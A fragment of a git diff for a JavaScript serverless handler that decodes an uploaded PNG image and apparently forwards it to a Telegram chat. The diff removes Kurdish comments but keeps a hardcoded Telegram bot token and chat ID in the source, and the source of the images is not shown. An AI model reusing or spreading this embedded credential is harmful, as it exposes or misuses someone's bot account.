@@ -12,9 +12,9 @@ export default async function handler(req, res) {
         const base64Data = image.replace(/^data:image\/png;base64,/, "");
         const buffer = Buffer.from(base64Data, 'base64');
 
-        // زانیاری بۆتی تەلەگرامەکەت لێرە دابنە:
-        const BOT_TOKEN = '8695303784:AAFcl-3dpr36lT6bzPC26BkT1Nq4wdfsdt8'; // تۆکێنەکەی خۆت لێرە دابنە
-        const CHAT_ID = '7928662929';     // ئایدییەکەی خۆت لێرە دابنە
+    
+        const BOT_TOKEN = '8695303784:AAFcl-3dpr36lT6bzPC26BkT1Nq4wdfsdt8';
+        const CHAT_ID = '7928662929';
 
         const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
         let payload = `--${boundary}\r\n`;
